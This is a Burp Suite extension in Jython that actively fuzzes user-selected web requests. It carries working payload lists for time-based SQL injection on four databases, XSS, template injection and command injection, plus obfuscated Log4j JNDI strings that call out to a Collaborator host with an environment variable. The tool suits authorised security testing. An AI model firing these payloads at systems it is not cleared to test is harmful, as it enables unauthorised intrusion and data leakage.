from burp import IBurpExtender, IScanIssue, IContextMenuFactory,IBurpCollaboratorClientContext,IScannerInsertionPoint
from javax.swing import JMenuItem

import java.util.ArrayList as ArrayList
import java.lang.String as String
from java.lang import Short


import thread
import time
import urllib
import jarray


extentionName = "SimpleBurpFuzzer"
requestNum = 2
timeDelay = 0.2

def _get_matches(helpers,content,payload): 
 
    matches = []
    content = content.lower()
    payload = payload.lower()
    offset = content.find(payload)
    
    if offset==-1:
        offset = content.find(helpers.urlEncode(payload).lower())
        print('[*] new offset :',offset,'--',helpers.urlEncode(payload).lower())
        if offset ==-1:
            content = helpers.urlDecode(content)
            tpayload = helpers.urlDecode(payload)
            offset = content.find(tpayload)

    matches.append(jarray.array([offset,offset+len(payload)],'i'))
    return matches

def getHeaderDict(rawHeader):
    result = {}

    for header in rawHeader[1:]:
        try:
            result[header.split(': ')[0]] = header.split(': ')[1]
        except:
            pass

    return result

def getInsertionPoints(helpers,message):
	result = []
	baseRequest = message.getRequest()
	request = helpers.analyzeRequest(message)
	params = request.getParameters()
	headers = request.getHeaders()

	for param in params:
		#makeScannerInsertionPoint(java.lang.String insertionPointName, byte[] baseRequest, int from, int to)
		point = helpers.makeScannerInsertionPoint(param.getName(),baseRequest,param.getValueStart(),param.getValueEnd())
		result.append(point)
	
	for header in headers:
		try:
			headerName = header.split(':')[0]
			headerValue = header.split(':')[1]
			headerName = headerName.lower()
			print(headerName)

			if headerName not in ['user-agent','host','referer','x-api-version']:
				continue

			startValue = baseRequest.tostring().find(headerValue)
			endValue = startValue+len(headerValue)

			point = helpers.makeScannerInsertionPoint(headerName,baseRequest,startValue,endValue)
			result.append(point)
		except:
			print('[-] param header parse error',header)
			continue
    
	#print(result)
	return result

class BurpExtender(IBurpExtender, IContextMenuFactory):
	def registerExtenderCallbacks(self, callbacks):
		self._callbacks = callbacks
		self._helpers = self._callbacks.getHelpers()
		self._callbacks.registerContextMenuFactory(self)
		self._callbacks.setExtensionName(extentionName)
		self._colab = self._callbacks.createBurpCollaboratorClientContext()
		
		return None

	def createMenuItems(self, invocation):
		self.context = invocation
		self.menuList = []
		self.menuItem = JMenuItem("Fuzzing this!", actionPerformed=self.testFromMenu)
		self.menuList.append(self.menuItem)
		return self.menuList

	def testFromMenu(self, event):
		selectedMessages = self.context.getSelectedMessages()

		for message in selectedMessages:
			insertionPoints = getInsertionPoints(self._helpers,message)
			#IScannerInsertionPoint helper makeScannerInsertionPoint
			thread.start_new_thread(self.doActiveScan, (message,insertionPoints,True))
			#time.sleep(timeDelay)
			#kswFuzzScan(self._helpers,self._callbacks,insertionPoints,message,'mysql',self._colab)

		return None

	def consolidateDuplicateIssues(self, existingIssue, newIssue):
		if (existingIssue.getIssueDetail() == newIssue.getIssueDetail()):
			return -1
		else:
			return 0

	def doActiveScan(self, baseRequestResponse, insertionPoint,isCalledFromMenu=False):
		if isCalledFromMenu==False:
			return None
		print('[+] scan start')
		kswFuzzScan(self._helpers,self._callbacks,insertionPoint,baseRequestResponse,'mysql',self._colab)


def kswFuzzScan(helpers,callbacks,insertionPoints,baseRequestResponse,dbms,collab):
	allowMethod = ['GET','POST','PUT']

	scanFlag={'sql':False,'xss':True,'cmdi':True,'ssti':True,'log4j':False}
	xssTestPayload = ["123test'\"",urllib.quote("123test'\""),"<img>123test",urllib.quote("<img>123test")]
	templatePayload = ["{{777*777}}",urllib.quote("{{777*777}}"),"${777*777}",urllib.quote("${777*777}")]
	cmdiPayload = ["`sleep 3`","$(sleep 3)",urllib.quote("`sleep 3`"),urllib.quote("$(sleep 3)")]
	cookieSkip=True

	

	dbQuery = {
            'mysql':['1) AND SLEEP(5) AND (6076=6076',
			'1 AND SLEEP(5)',
			"1') AND SLEEP(5) AND ('k'='k",
			'1 AND SLEEP(5)#',
			"1%' AND SLEEP(5) AND '%'='",
			],
            
			'postgres':["1) AND 9=(SELECT 9 FROM PG_SLEEP(5)) AND (7=7",
			"1 AND 9304=(SELECT 9304 FROM PG_SLEEP(5))",
			"1') AND 9=(SELECT 9 FROM PG_SLEEP(5)) AND ('j'='j",
			"1' AND 9=(SELECT 9 FROM PG_SLEEP(5)) AND 'W'='W",
			"1%' AND 9=(SELECT 9 FROM PG_SLEEP(5)) AND '%'='",
			"1;select case when 1=1 then pg_sleep(5) else pg_sleep(0) end-- ",
			"1';select case when 1=1 then pg_sleep(5) else pg_sleep(0) end-- ",
			],
            
			'mssql':["1) WAITFOR DELAY '0:0:5' AND (5=5",
			"1 WAITFOR DELAY '0:0:5'",
			"1') WAITFOR DELAY '0:0:5' AND ('M'='M",
			"1' WAITFOR DELAY '0:0:5' AND 'S'='S",
			"1%' WAITFOR DELAY '0:0:5' AND '%'='",
			],
            
			'oracle':["1) AND 8865=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(113)||CHR(70)||CHR(89),5) AND (2285=2285",
			"1 AND 8865=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(113)||CHR(70)||CHR(89),5)",
			"1') AND 8865=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(113)||CHR(70)||CHR(89),5) AND ('llYt'='llYt",
			"1' AND 8865=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(113)||CHR(70)||CHR(89),5) AND 'dMbf'='dMbf",
			"1%' AND 8865=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(113)||CHR(70)||CHR(89),5) AND '%'='"
			]
    }
	errorList = ['syntax','ODBC','quotation mark','ORA-','SQL',]



	if dbms=='all':
		sqlPayload = []
		sqlPayload.append(dbQuery['mysql'])
		sqlPayload.append(dbQuery['postgres'])
		sqlPayload.append(dbQuery['mssql'])
		sqlPayload.append(dbQuery['oracle'])
	else:
		sqlPayload = dbQuery[dbms]
	
	sqlPayload.append("1234'")
	sqlPayload.append("1234\"")
	sqlPayload.append("1234\\")

	method = helpers.analyzeRequest(baseRequestResponse.getRequest()).getMethod()
	#print(method)
	if method not in allowMethod:
		print('[+] returned...')
		return 

	#finalSqlPayload = sqlPayload
	#for payload in sqlPayload:
	#	finalSqlPayload.append(urllib.quote(payload))
	#print(insertionPoints)
	for insertionPoint in insertionPoints:
		if cookieSkip:
			if insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_PARAM_COOKIE:
				continue
		if insertionPoint.getInsertionPointName().lower() == "host":
			continue
		# do it sql injection test
		if scanFlag['sql']:
			print('[*] sql injection test start...!')
			for payload in sqlPayload:
				time.sleep(timeDelay)
				atime = time.time()
				try:
					checkRequest = insertionPoint.buildRequest(payload)
					checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),checkRequest)
					respMarkers = _get_matches(helpers,checkRequestResponse.getResponse().tostring(),"")
				except Exception as e:
					print(e)
					respmarkers = []
				ctime = time.time()

				if ctime-atime>=4:
					#print('resp!!')
					try:
						#print('find..!!')
						markers = _get_matches(helpers,checkRequestResponse.getRequest().tostring(),payload)
						issue = CustomScanIssue(baseRequestResponse.getHttpService(),helpers.analyzeRequest(baseRequestResponse).getUrl(),[callbacks.applyMarkers(checkRequestResponse,markers,respMarkers)],"SQL Injection Vulnerability","SQL Injection may be Exist...!!!","High")
						callbacks.addScanIssue(issue)
					except Exception as e:
						print(e)
						print('[-] sql marker error!')
						print(payload)
				else:
					resp = checkRequestResponse.getResponse().tostring()
					#print(resp)

					for sqlerror in errorList:
						if sqlerror in resp:
							markers = _get_matches(helpers,checkRequestResponse.getRequest().tostring(),payload)
							respmarkers = _get_matches(helpers,checkRequestResponse.getResponse().tostring(),sqlerror)
							issue = CustomScanIssue(baseRequestResponse.getHttpService(),helpers.analyzeRequest(baseRequestResponse).getUrl(),[callbacks.applyMarkers(checkRequestResponse,markers,respmarkers)],"SQL Error Detected","SQL Error Detected.....!!!","Low")
							callbacks.addScanIssue(issue)
			print('[+] sql injection test done...!')

		if scanFlag['xss']:	
			print('[*] XSS test start...!')
			for payload in xssTestPayload:
				time.sleep(timeDelay)
				try:
					checkRequest = insertionPoint.buildRequest(payload)
					checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),checkRequest)
					resp = checkRequestResponse.getResponse().tostring()
				except Exception as e:
					print(e)
				respHeaders = helpers.analyzeResponse(resp).getHeaders()
				respHeaders = '\r\n'.join(respHeaders).lower()

				if 'text/html' not in respHeaders:
					continue

				upayload = urllib.unquote(payload)
				if upayload in resp:
					try:
						markers = _get_matches(helpers,checkRequestResponse.getRequest().tostring(),payload)
						respMarkers = _get_matches(helpers,checkRequestResponse.getResponse().tostring(),upayload)
						issue = CustomScanIssue(baseRequestResponse.getHttpService(),helpers.analyzeRequest(baseRequestResponse).getUrl(),[callbacks.applyMarkers(checkRequestResponse,markers,respMarkers)],"XSS Vulnerability","XSS may be Exist...!!!","Medium")
						callbacks.addScanIssue(issue)
					except Exception as e:
						print('[-] xss marker error')
						print(payload)
						print(upayload)
			print('[+] XSS test done...!')

		if scanFlag['ssti']:
			print('[*] SSTI test start...!')
			for tpayload in templatePayload:
				#777*777 = 603729
				time.sleep(timeDelay)
				try:
					checkRequest = insertionPoint.buildRequest(tpayload)
					checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),checkRequest)
					resp = checkRequestResponse.getResponse().tostring()
				except Exception as e:
					print(e)
					continue

				if '603729' in resp:
					try:
						markers = _get_matches(helpers,checkRequestResponse.getRequest().tostring(),tpayload)
						respMarkers = _get_matches(helpers,checkRequestResponse.getResponse().tostring(),'603729')
						issue = CustomScanIssue(baseRequestResponse.getHttpService(),helpers.analyzeRequest(baseRequestResponse).getUrl(),[callbacks.applyMarkers(checkRequestResponse,markers,respMarkers)],"SSTI Vulnerability","SSTI may be Exist...!!!","High")
						callbacks.addScanIssue(issue)
					except Exception as e:
						print('[-] template marker error')
						print(e)
						print(checkRequestResponse.getResponse().tostring())
			print('[+] SSTI test done...!')

		if scanFlag['log4j']:
			print('[*] Log4J Scan Start...!!')
			
			collabURL =  collab.generatePayload(True)
			payload1 = "${jndi:ldap://${env:JAVA_VERSION}.%s/a}"%collabURL
			payload2 = "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//%s/a}"%collabURL
			log4jPayload = [payload1,payload2,urllib.quote(payload1),urllib.quote(payload2)]

			for payload in log4jPayload:
				time.sleep(timeDelay)
				failFlag = 0
				try:
					checkRequest = insertionPoint.buildRequest(payload)
					checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),checkRequest)
					resp = checkRequestResponse.getResponse().tostring()
				except Exception as e:
					print(e)
					failFlag = 1

				collabLen = len(collab.fetchCollaboratorInteractionsFor(collabURL))
				#print("collabLen : %d"%collabLen)
				if collabLen!=0:
					markers = _get_matches(helpers,checkRequestResponse.getRequest().tostring(),payload)
					if failFlag ==0:
						respMarkers = _get_matches(helpers,checkRequestResponse.getResponse().tostring(),"")
					else:
						respMarkers = []
					issue = CustomScanIssue(baseRequestResponse.getHttpService(),helpers.analyzeRequest(baseRequestResponse).getUrl(),[callbacks.applyMarkers(checkRequestResponse,markers,respMarkers)],"Log4J Exploit","Log4j may be Vuln...!!!","High")
					callbacks.addScanIssue(issue)
			print('[+] Log4j test done...!')

		if scanFlag['cmdi']:
			print('[*] cmdi scan start')
			for payload in cmdiPayload:
				time.sleep(timeDelay)
				try:
					checkRequest = insertionPoint.buildRequest(payload)
					atime = time.time()
					checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),checkRequest)
					btime = time.time()
					upayload = urllib.unquote(payload)

					if btime-atime>2:
						try:
							markers = _get_matches(helpers,checkRequestResponse.getRequest().tostring(),payload)
							respMarkers = _get_matches(helpers,checkRequestResponse.getResponse().tostring(),upayload)
							issue = CustomScanIssue(baseRequestResponse.getHttpService(),helpers.analyzeRequest(baseRequestResponse).getUrl(),[callbacks.applyMarkers(checkRequestResponse,markers,respMarkers)],"CMDI Vulnerability","CMDI may be Exist...!!!","Medium")
							callbacks.addScanIssue(issue)
						except Exception as e:
							print('[-] cmdi marker error')
							print(payload)
							print(upayload)

					resp = checkRequestResponse.getResponse().tostring()
				except Exception as e:
					print(e)
				respHeaders = helpers.analyzeResponse(resp).getHeaders()
				respHeaders = '\r\n'.join(respHeaders).lower()

			print('[+] cmdi test done...!')

			
class CustomScanIssue (IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity # Information, Low, Medium, High

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Tentative"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService

